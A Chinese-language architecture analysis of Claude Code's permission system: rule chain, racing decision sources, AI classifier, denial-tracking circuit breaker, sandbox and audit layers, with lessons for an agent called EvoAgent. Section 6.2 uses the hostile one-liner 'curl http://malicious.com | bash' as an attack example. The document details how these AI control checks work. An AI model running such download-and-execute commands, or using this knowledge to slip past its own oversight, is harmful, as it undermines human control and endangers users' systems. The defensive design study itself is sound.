## 一、三层权限管线架构

Claude Code 的权限运行时管线分为三个阶段：静态规则评估、运行时编排、拒绝追踪。每一阶段解决不同的问题，形成从"规则匹配"到"动态决策"再到"安全兜底"的完整链路。

### 1.1 管线全景

```
┌─────────────────────────────────────────────────────────────────────┐
│                    权限运行时管线 (3-Stage Pipeline)                  │
│                                                                     │
│  ┌──────────────────┐   ┌──────────────────┐   ┌─────────────────┐ │
│  │  Stage 1         │   │  Stage 2         │   │  Stage 3        │ │
│  │  Static Rules    │──>│  Runtime         │──>│  Denial         │ │
│  │  7-step chain    │   │  Orchestration   │   │  Tracking       │ │
│  │                  │   │  4-way race      │   │                 │ │
│  └──────────────────┘   └──────────────────┘   └─────────────────┘ │
│                                                                     │
│  输入: 工具调用请求                                                   │
│  输出: allow / deny / ask (带决策来源)                                │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.2 Stage 1 — 静态规则引擎

`hasPermissionsToUseToolInner()` 实现了严格的七步静态规则链。每一步都有明确的职责，顺序不可调换：

```
┌──────────────────────────────────────────────────────────────────┐
│              hasPermissionsToUseToolInner() 七步检查链             │
│                                                                  │
│  Step 1a: Deny 规则检查 ─── 匹配 → 立即返回 deny                 │
│              │                                                   │
│  Step 1b: Ask 规则检查 ─── 匹配 → 返回 ask                      │
│              │                                                   │
│  Step 1c: 工具自身 checkPermissions()                            │
│              │                                                   │
│  Step 1d: 工具拒绝 ──────── deny → 返回 deny                    │
│              │                                                   │
│  Step 1e: requiresUserInteraction? ── 是 → 返回 ask              │
│              │                                                   │
│  Step 1f: 内容级 Ask 规则 ── 匹配 → 返回 ask                    │
│              │                                                   │
│  Step 1g: 安全检查 ──────── 敏感路径 → 返回 ask (bypass-immune)  │
│              │                                                   │
│  Step 2a: bypassPermissions 模式? ── 是 → 返回 allow           │
│              │                                                   │
│  Step 2b: Allow 规则检查 ── 匹配 → 返回 allow                   │
│              │                                                   │
│  Step 3:  默认 ────────────── 返回 ask                          │
└──────────────────────────────────────────────────────────────────┘
```

**关键洞察**：Deny 永远最先检查（Step 1a），一旦匹配立即返回，后续步骤无法覆盖。这是安全系统中最基本的"默认拒绝"原则。

**设计模式**：责任链模式（Chain of Responsibility）——每一步都是一个独立的检查节点，按优先级串联执行，任一步骤可短路整个链路。

七步检查中有几个关键设计决策：

1. **Deny 优先**（Step 1a）：Deny 规则一旦匹配就立即返回，没有任何后续步骤可以覆盖 Deny
2. **工具递归检查**（Step 1c）：每个工具可实现自己的 `checkPermissions()` 方法，例如 Bash 工具会解析命令中的子命令，对每个子命令分别做权限检查，形成递归检查链
3. **安全检查不可绕过**（Step 1g）：即使处于 `bypassPermissions` 模式，涉及 `.git/`、`.claude/`、shell 配置文件等敏感路径的操作仍然返回 `ask`

### 1.3 后处理：模式转换漏斗

`hasPermissionsToUseTool()` 在 `hasPermissionsToUseToolInner()` 返回后，还有一层重要的后处理逻辑，形成三层漏斗模型：

```
┌──────────────────────────────────────────────────────────────┐
│                    模式转换漏斗模型                            │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐     │
│  │  dontAsk 模式: ask → deny                           │     │
│  │  (无头环境，不能询问用户，直接拒绝)                      │     │
│  └──────────────────────┬──────────────────────────────┘     │
│                         │                                    │
│  ┌──────────────────────▼──────────────────────────────┐     │
│  │  auto 模式: ask → 三层快速路径                        │     │
│  │                                                      │     │
│  │  Layer 1: acceptEdits 快速路径                        │     │
│  │  (工作目录内文件编辑，直接放行)                          │     │
│  │           │                                          │     │
│  │  Layer 2: SAFE_YOLO_ALLOWLISTED_TOOLS 白名单         │     │
│  │  (Read/Grep/Glob 等只读工具，直接放行)                  │     │
│  │           │                                          │     │
│  │  Layer 3: AI 分类器 (classifyYoloAction)             │     │
│  │  (无法快速处理的操作，调用分类器)                        │     │
│  └─────────────────────────────────────────────────────┘     │
└──────────────────────────────────────────────────────────────┘
```

**关键洞察**：漏斗模型的核心思想是"能用便宜方法解决的，绝不调用昂贵的 API"。大多数安全的 Bash 命令（如 `ls`、`git status`）在前两层就能被快速放行，只有无法确定的操作才需要调用 AI 分类器。

### 1.4 Stage 2 — 运行时编排

当静态规则引擎返回 `ask` 时，系统进入运行时编排阶段。`useCanUseTool` hook 根据当前 Agent 类型选择不同的处理路径：

```
┌──────────────────────────────────────────────────────────────────┐
│                  useCanUseTool 三种 Agent 分支                    │
│                                                                  │
│                    ┌─────────────┐                               │
│                    │  ask 决策    │                               │
│                    └──────┬──────┘                               │
│                           │                                      │
│              ┌────────────┼────────────┐                         │
│              │            │            │                         │
│     ┌────────▼────┐ ┌────▼─────┐ ┌────▼──────────┐             │
│     │ Coordinator │ │  Swarm   │ │   主 Agent     │             │
│     │   Worker    │ │  Worker  │ │                │             │
│     └──────┬──────┘ └────┬─────┘ └────┬──────────┘             │
│            │             │            │                         │
│     awaitAuto-      转发给      handleInteractive-               │
│     matedChecks     Leader      Permission                       │
│            │             │            │                         │
│     有结果?→返回    等待决策    四路竞速启动                       │
│     无结果?→对话框                                                   │
└──────────────────────────────────────────────────────────────────┘
```

- **Coordinator Worker**：先等待自动检查（分类器、Hook）完成，只有自动检查无法决策时才显示对话框。设计意图：后台工作器应尽量减少对用户的打扰
- **Swarm Worker**：将权限请求转发给 Swarm Leader 处理，子 Agent 不直接与用户交互
- **主 Agent**：直接进入交互模式，启动多路竞速

### 1.5 Stage 3 — 拒绝追踪

拒绝追踪是整个管线的安全兜底机制。详见第三章的完整分析。

## 二、四路竞速架构 (4-Way Race)

### 2.1 竞速架构概览

`handleInteractivePermission()` 是权限运行时最复杂的组件。它不返回 Promise，而是设置回调，让四个异步参与者竞争决策权：

```
┌──────────────────────────────────────────────────────────────────┐
│              handleInteractivePermission 四路竞速                   │
│                                                                  │
│  ┌──────────────┐                                                │
│  │ 权限请求入队  │                                                │
│  └──────┬───────┘                                                │
│         │                                                        │
│    ┌────┼────────────┬──────────────┬──────────────┐             │
│    │    │            │              │              │             │
│    ▼    ▼            ▼              ▼              ▼             │
│ ┌─────┐ ┌─────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐      │
│ │ 竞速1│ │ 竞速2│  │  竞速3   │  │  竞速4   │  │  竞速5   │      │
│ │     │ │     │  │          │  │          │  │          │      │
│ │用户 │ │Hook │  │AI 分类器 │  │远程审批  │  │ 超时    │      │
│ │界面 │ │响应 │  │(Bash)    │  │(CCR/     │  │(可配置  │      │

│ │框   │ │     │  │          │  │          │  │          │      │
│ └──┬──┘ └──┬──┘  └────┬─────┘  └────┬─────┘  └────┬─────┘      │
│    │       │          │              │              │             │
│    └───────┴──────────┴──────┬───────┴──────────────┘             │
│                              │                                   │
│                    ┌─────────▼─────────┐                         │
│                    │  claim() 原子操作   │                         │
│                    │  第一个到达的赢     │                         │
│                    └─────────┬─────────┘                         │
│                              │                                   │
│                    ┌─────────▼─────────┐                         │
│                    │    最终决策        │                         │
│                    └───────────────────┘                         │
└──────────────────────────────────────────────────────────────────┘
```

### 2.2 claim 原子操作

核心机制是 `createResolveOnce()` 创建的 claim 原子操作：

```typescript
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value) {
      if (claimed) return
      claimed = true
      resolve(value)
    },
  }
}
```

每个参与者完成时都调用 `claim()`。只有第一个调用者返回 `true`，后续调用者全部返回 `false`。无论多少个异步参与者同时完成，最终决策只会被采纳一次。

**关键洞察**：`claim()` 使用简单的布尔标志实现"先到先得"语义，避免了复杂的并发锁。JavaScript 单线程事件循环保证了 `claimed` 标志的原子性。

**设计模式**：竞争消费者模式（Competing Consumer）——多个生产者竞争同一个消费者的处理权，第一个成功 claim 的获胜。

### 2.3 投机性分类器检查

对于 Bash 命令，`useCanUseTool` 在显示对话框之前，会启动一个 2 秒的"投机性分类器检查"：

```typescript
const speculativePromise = peekSpeculativeClassifierCheck(command)
if (speculativePromise) {
  const raceResult = await Promise.race([
    speculativePromise.then(r => ({ type: 'result', result: r })),
    new Promise(res => setTimeout(res, 2000, { type: 'timeout' })),
  ])
  if (raceResult.type === 'result' && result.matches && confidence === 'high') {
    resolve(buildAllow(...))
    return
  }
}
```

如果分类器在 2 秒内返回了高置信度的"安全"判断，就直接允许操作，跳过对话框。这利用了一个事实：大多数安全的 Bash 命令可以在短时间内被分类器识别。

### 2.4 用户交互的优雅期

当用户开始与权限对话框交互时，系统会取消正在运行的分类器检查。但有一个 200ms 的优雅期：

```typescript
const GRACE_PERIOD_MS = 200
onUserInteraction() {
  if (Date.now() - permissionPromptStartTimeMs < GRACE_PERIOD_MS) {
    return  // 忽略过早的交互
  }
  userInteracted = true
  clearClassifierChecking(toolUseID)
}
```

如果用户在对话框出现后的 200ms 内按键（可能是之前操作的惯性），这些按键会被忽略。这防止了用户意外取消分类器的自动批准。

### 2.5 分类器批准的视觉反馈

当分类器在用户看到对话框之后自动批准了操作，系统不会立即移除对话框，而是显示一个短暂的"勾号"过渡：

```typescript
const checkmarkMs = getTerminalFocused() ? 3000 : 1000
checkmarkTransitionTimer = setTimeout(() => {
  ctx.removeFromQueue()
}, checkmarkMs)
```

终端聚焦时显示 3 秒，不聚焦时显示 1 秒。这个设计考虑了用户的心理模型：如果对话框突然消失而没有视觉反馈，用户可能会困惑。

### 2.6 远程审批的双通道

`handleInteractivePermission` 支持两种远程审批机制：

1. **Bridge（CCR）**：通过 `bridgeCallbacks` 将权限请求发送到 claude.ai 网页端，用户在网页上点击"允许"或"拒绝"
2. **Channel**：通过 MCP 服务器的 `channel_permission_request` 通知，将请求发送到 Telegram、iMessage 等渠道

两种远程审批与本地交互、Hook、分类器一起参与 `claim()` 竞速，无论用户在哪个端点响应，最先到达的决策生效。

## 三、拒绝追踪与降级 (Denial Tracking)

### 3.1 核心数据结构

拒绝追踪机制位于 `utils/permissions/denialTracking.ts`，维护两个计数器：

```typescript
const DENIAL_LIMITS = {
  maxConsecutive: 3,   // 连续拒绝上限
  maxTotal: 20,        // 总拒绝上限
}
```

### 3.2 状态机模型

```
┌──────────────────────────────────────────────────────────────────┐
│                    拒绝追踪状态机                                  │
│                                                                  │
│  ┌─────────────┐    recordSuccess()    ┌─────────────┐          │
│  │  正常运行    │ <─────────────────── │  正常运行    │          │
│  │             │                       │             │          │
│  │ consecutive │                       │ consecutive │          │
│  │   = 0       │                       │   = 0       │          │
│  │ total < 20  │                       │ total < 20  │          │
│  └──────┬──────┘                       └─────────────┘          │
│         │                                                      │
│  recordDenial()                                                  │
│         │                                                      │
│    ┌────┴──────────────────────────────┐                        │
│    │                                   │                        │
│    ▼                                   ▼                        │
│  consecutive >= 3                  total >= 20                   │
│  (连续拒绝3次)                     (总拒绝20次)                    │
│    │                                   │                        │
│    └─────────────┬─────────────────────┘                        │
│                  │                                              │
│                  ▼                                              │
│         shouldFallbackToPrompting()                             │
│                  │                                              │
│         ┌───────┴────────┐                                      │
│         │                │                                      │
│    交互式 Agent      无头 Agent                                  │
│    (有用户界面)      (后台运行)                                   │
│         │                │                                      │
│         ▼                ▼                                      │
│   回退到用户交互     抛出 AbortError                             │
│   弹出权限对话框     终止整个 Agent                              │
│         │                │                                      │
│         ▼                ▼                                      │
│   handleDenialLimitExceeded()                                   │
└──────────────────────────────────────────────────────────────────┘
```

### 3.3 三个核心函数

**`recordDenial()`**：递增两个计数器（consecutive + 1, total + 1）

**`recordSuccess()`**：仅重置 consecutive 计数器（total 不重置），因为一次成功不代表历史拒绝风险消失

**`shouldFallbackToPrompting()`**：检查任一阈值是否超限，返回布尔值

### 3.4 降级策略

`handleDenialLimitExceeded()` 实现了两条降级路径：

- **交互式 Agent**：回退到用户交互模式，强制弹出权限对话框，让人类审查发生了什么
- **无头 Agent**（`shouldAvoidPermissionPrompts`）：直接抛出 `AbortError`，终止整个 Agent。因为后台 Agent 无法弹出对话框，宁可终止也不能无限重试

### 3.5 持久化支持

`persistDenialState()` 支持两种场景：

- **本地子 Agent**：通过 in-place mutation 直接修改父 Agent 的状态
- **全局状态**：通过 `setState` 更新全局拒绝计数

**关键洞察**：拒绝追踪是一个优雅的安全阀。设计者的洞察是：如果分类器持续拒绝操作，很可能意味着 Agent 的意图与安全策略存在系统性冲突，此时不应该让 Agent 无休止地重试，而应该引入人类判断。

**设计模式**：断路器模式（Circuit Breaker）——当失败次数达到阈值时，自动"断开"自动决策路径，回退到更安全的人工决策路径。

## 四、Hook 权限决策覆盖

### 4.1 resolveHookPermissionDecision()

Hook 系统允许外部代码参与权限决策，但 Hook 的 `allow` 决策不是绝对的。`resolveHookPermissionDecision()` 实现了"规则优先于 Hook"的安全策略：

```
┌──────────────────────────────────────────────────────────────────┐
│              resolveHookPermissionDecision() 决策流               │
│                                                                  │
│  ┌──────────────┐                                                │
│  │ Hook 返回     │                                                │
│  │ 'allow'      │                                                │
│  └──────┬───────┘                                                │
│         │                                                        │
│         ▼                                                        │
│  ┌──────────────────────────────────────┐                        │
│  │ 仍然检查 Deny / Ask 规则              │                        │
│  │                                      │                        │
│  │  有 Deny 规则匹配?                    │                        │
│  │    ├─ 是 → deny (规则覆盖 Hook!)      │                        │
│  │    └─ 否 → 继续                      │                        │
│  │                                      │                        │
│  │  有 Ask 规则匹配?                     │                        │
│  │    ├─ 是 → ask (规则覆盖 Hook!)       │                        │
│  │    └─ 否 → allow (Hook 决策生效)      │                        │
│  └──────────────────────────────────────┘                        │
│                                                                  │
│  核心原则: Rule deny ALWAYS overrides hook allow                  │
└──────────────────────────────────────────────────────────────────┘
```

**关键洞察**：Hook 返回 `allow` 但系统仍然检查 deny/ask 规则。规则 deny 始终覆盖 Hook allow。这是"安全优先"原则的体现——外部 Hook 可能被恶意配置，但系统规则是用户直接控制的信任锚点。

### 4.2 runPermissionRequestHooksForHeadlessAgent()

对于无头 Agent（后台运行、无法弹出对话框），系统提供了 Hook 回退机制：

```
┌──────────────────────────────────────────────────────────────────┐
│         无头 Agent 的权限决策降级链                                │
│                                                                  │
│  ┌──────────────┐                                                │
│  │ 权限请求      │                                                │
│  └──────┬───────┘                                                │
│         │                                                        │
│         ▼                                                        │
│  ┌──────────────────────────────┐                                │
│  │ runPermissionRequestHooks    │                                │
│  │ ForHeadlessAgent()           │                                │
│  │                              │                                │
│  │ 尝试通过 Hook 获取决策        │                                │
│  └──────┬───────────────────────┘                                │
│         │                                                        │
│    ┌────┴────────────┐                                           │
│    │                 │                                           │
│    ▼                 ▼                                           │
│  Hook 有结果      Hook 无结果                                     │
│    │                 │                                           │
│    ▼                 ▼                                           │
│  使用 Hook 决策   AUTO_REJECT_MESSAGE                            │
│                   (自动拒绝)                                      │
│    │                 │                                           │
│    └────────┬────────┘                                           │
│             │                                                    │
│             ▼                                                    │
│       recordDenial()                                             │
│             │                                                    │
│             ▼                                                    │
│       达到上限?                                                   │
│       ├─ 是 → AbortError (终止 Agent)                            │
│       └─ 否 → 继续                                               │
└──────────────────────────────────────────────────────────────────┘
```

**设计模式**：降级链模式（Fallback Chain）——为无头环境设计多层降级路径：Hook 自动决策 → 自动拒绝 → 拒绝计数 → 终止 Agent。每一层都比上一层更保守。

### 5.2 慢决策日志

在 Auto 模式下，系统会检测决策耗时过长的权限请求并记录日志。这帮助识别分类器性能瓶颈和异常情况。

### 5.3 代码编辑计数追踪

系统对代码编辑操作进行计数追踪，用于合规审查。这确保了 Agent 的代码修改行为可以被完整追溯。

### 5.4 审计数据的实时使用

审计数据不仅用于事后分析，还用于系统的实时优化：

- **拒绝限流**：连续拒绝次数达到阈值时回退到用户交互模式
- **分析遥测**：帮助 Anthropic 理解权限系统使用模式，优化分类器准确率
- **分类器性能优化**：`stage1DurationMs`、`stage2DurationMs`、`promptLengths` 等指标指导两阶段策略调优

**关键洞察**：审计不是事后的补充，而是纵深防御不可或缺的一层。它回答了一个关键问题："如果所有防御层都失败了，我们至少需要知道发生了什么。"

## 六、四层纵深防御体系 (Defense in Depth)

### 6.1 纵深防御全景

Claude Code 的安全架构遵循纵深防御原则——多层安全机制层层叠加，每一层弥补上一层的不足：

```
┌──────────────────────────────────────────────────────────────────┐
│                    四层纵深防御体系                                │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │ 第一层: 输入验证 (Input Validation)                         │  │
│  │                                                            │  │
│  │ - Zod Schema 校验所有工具输入参数                            │  │
│  │ - 文件路径: pathInAllowedWorkingPath() 路径遍历检测          │  │
│  │ - Bash 命令: splitCommand_DEPRECATED 子命令解析             │  │
│  │ - 敏感文件路径检测: .git/ .claude/ shell配置文件             │  │
│  │ - 跨平台路径绕过检测 (Windows C:\ → D:\)                    │  │
│  │ - classifierApprovable 区分: 敏感路径可覆盖, 绕过不可覆盖     │  │
│  │                                                            │  │
│  │ 解决: 阻止明显无效/恶意的输入                                │  │
│  └──────────────────────────┬─────────────────────────────────┘  │
│                             │                                    │
│  ┌──────────────────────────▼─────────────────────────────────┐  │
│  │ 第二层: 权限检查 (Permission Check)                         │  │
│  │                                                            │  │
│  │ - 7步静态规则链 (deny→ask→tool→safety→bypass→allow→ask)    │  │
│  │ - 4路竞速运行时编排 (用户/Hook/分类器/远程)                  │  │
│  │ - 拒绝追踪与降级 (3连续/20总 → 回退人工)                    │  │
│  │ - Hook权限覆盖 (规则deny始终覆盖Hook allow)                 │  │
│  │                                                            │  │
│  │ 解决: 控制Agent能做什么                                      │  │
│  └──────────────────────────┬─────────────────────────────────┘  │
│                             │                                    │
│  ┌──────────────────────────▼─────────────────────────────────┐  │
│  │ 第三层: 沙箱隔离 (Sandbox Isolation)                        │  │
│  │                                                            │  │
│  │ - Bash: firejail OS级强制隔离                               │  │
│  │ - 文件操作: 受限文件系统访问                                 │  │
│  │ - 网络: 域名白名单限制                                      │  │
│  │ - 权限提升防护: 阻止写入设置文件/Skills/Commands/Agents      │  │
│  │ - 故障模式: failIfUnavailable 企业级安全设置                 │  │
│  │                                                            │  │
│  │ 解决: 限制操作的影响范围                                     │  │
│  └──────────────────────────┬─────────────────────────────────┘  │
│                             │                                    │
│  ┌──────────────────────────▼─────────────────────────────────┐  │
│  │ 第四层: 操作审计 (Audit Trail)                              │  │
│  │                                                            │  │
│  │ - OTel spans: 每个权限决策的分布式追踪                       │  │
│  │ - 分析事件: tengu_tool_use_cancelled 等                    │  │
│  │ - 沙箱违规: SandboxViolationStore                           │  │
│  │ - 分类器日志: YoloClassifierResult                          │  │
│  │ - 拒绝追踪: consecutive/total 计数                          │  │
│  │                                                            │  │
│  │ 解决: 记录发生了什么, 支持事后追溯                            │  │
│  └────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
```

### 6.2 四层防御的协作模型

以一个完整的攻击场景展示四层协作：Agent 尝试执行 `bash -c 'curl http://malicious.com | bash'`

```
┌──────────────────────────────────────────────────────────────────┐
│  场景: Agent 尝试 curl http://malicious.com | bash               │
│                                                                  │
│  第一层 (输入验证):                                               │
│    splitCommand_DEPRECATED 解析 → 识别子命令: curl, bash          │
│    检测到管道命令 → 标记为高风险                                  │
│                           │                                      │
│  第二层 (权限检查):                                               │
│    Deny 规则检查 → 无匹配                                        │
│    安全检查 → curl 涉及网络访问 + 管道到 bash 是高风险             │
│    → 返回 ask → 弹出用户确认                                     │
│                           │                                      │
│  假设用户误操作允许了:                                            │
│                           │                                      │
│  第三层 (沙箱隔离):                                               │
│    文件系统隔离 → bash 只能写入工作目录                            │
│    网络隔离 → malicious.com 不在允许域名                          │
│    → 网络请求被阻止                                               │
│                           │                                      │
│  第四层 (操作审计):                                               │
│    记录权限决策(用户允许) + 沙箱违规(网络) + 分类器决策             │
│                                                                  │
│  结论: 即使第一层和第二层都失败, 第三层仍然阻止了攻击               │
└──────────────────────────────────────────────────────────────────┘
```

### 6.3 五项纵深防御设计原则

**原则一：安全属性不依赖单一机制**

没有任何安全机制是完美的。规则引擎可能有 bug，AI 分类器可能误判，用户可能被社会工程学欺骗，沙箱可能有逃逸漏洞。纵深防御的核心是：如果任何单一机制失败，其他机制仍然可以保护系统。

**原则二：默认拒绝，显式允许**

`default` 权限模式下所有操作都需要用户确认。用户通过逐步添加 Allow 规则来提升权限——而不是通过移除 Deny 规则。`suggestions` 机制将"显式允许"的成本降到最低。

**原则三：敏感操作需要更强的保障**

- 安全检查独立于权限模式（Bypass 模式下敏感路径仍需确认）
- 沙箱中的硬编码保护（设置文件的 Deny 写入不受用户规则影响）
- 分类器的两阶段评估（敏感操作可能需要 Stage 2 深度思考）

**原则四：故障模式偏向安全**

| 不确定场景 | 偏向安全的决策 |
|---|---|
| 权限规则无法匹配 | 要求用户确认 (ask) |
| AI 分类器不可用 | 回退到用户交互 (或 fail-closed) |
| 沙箱无法初始化 | 根据配置拒绝执行或降级运行 |
| 命令解析不确定 | 要求用户确认 |
| 拒绝次数过多 | 回退到用户交互或终止 Agent |

**原则五：可审计性是安全的基石**

如果无法追溯发生了什么，就无法验证安全策略是否有效。审计日志覆盖权限决策、沙箱违规、分类器判断等多个维度，为安全运营提供基础数据。

## 七、对 EvoAgent 的参考价值

### 7.1 四路竞速用于并发权限解析

EvoAgent 可以借鉴 Claude Code 的四路竞速架构来处理权限决策。当 Agent 需要执行敏感操作时，多个决策源（规则引擎、AI 分类器、用户审批、外部 Hook）并发运行，第一个返回有效决策的胜出。这种模式既保证了安全性，又不会不必要地增加延迟。

**实现要点**：
- 使用 `createResolveOnce()` 模式的原子 claim 机制
- 为无头环境设计降级链（Hook → 自动拒绝 → 计数 → 终止）
- 投机性检查 + 超时的组合减少用户等待时间

### 7.2 拒绝追踪与优雅降级

EvoAgent 的自动决策系统需要类似的拒绝追踪机制。当 AI 分类器或自动化系统持续拒绝操作时，应该自动回退到人工审查，而不是无限重试。

**实现要点**：
- 双计数器设计：consecutive（连续拒绝）+ total（总拒绝）
- `recordSuccess()` 只重置 consecutive 不重置 total
- 无头环境达到上限时终止而非重试

### 7.3 Hook 基础的权限扩展

Claude Code 的 Hook 系统允许外部代码参与权限决策，但遵循"规则优先于 Hook"的安全原则。EvoAgent 可以采用类似的扩展机制，让第三方插件或企业策略参与权限决策，同时确保核心安全规则不被覆盖。

**实现要点**：
- Hook allow 不等于最终 allow，仍需通过规则检查
- Rule deny 始终覆盖 Hook allow
- Hook 无结果时走默认降级路径

### 7.4 纵深防御作为系统性架构

Claude Code 的四层纵深防御不是事后补充，而是从一开始就作为系统性架构设计的。EvoAgent 应该将安全设计融入架构的每一层，而不是作为外挂的安全模块。

**实现要点**：
- 输入验证 → 权限检查 → 沙箱隔离 → 审计追踪，四层缺一不可
- 每层独立运作，不依赖其他层的正确性
- 每一层都是其他层的备份，没有单点失败

### 7.5 审计追踪用于合规与调试

EvoAgent 的权限系统应该内置完整的审计追踪能力。每条权限决策记录工具名、输入参数、决策结果、决策来源和耗时。这不仅是安全合规的要求，也是调试和系统优化的基础。

**实现要点**：
- 权限决策日志 + 沙箱违规日志 + 分类器决策日志 + 分析遥测事件
- 审计数据同时服务于事后分析和实时优化
- 慢决策检测和异常模式识别
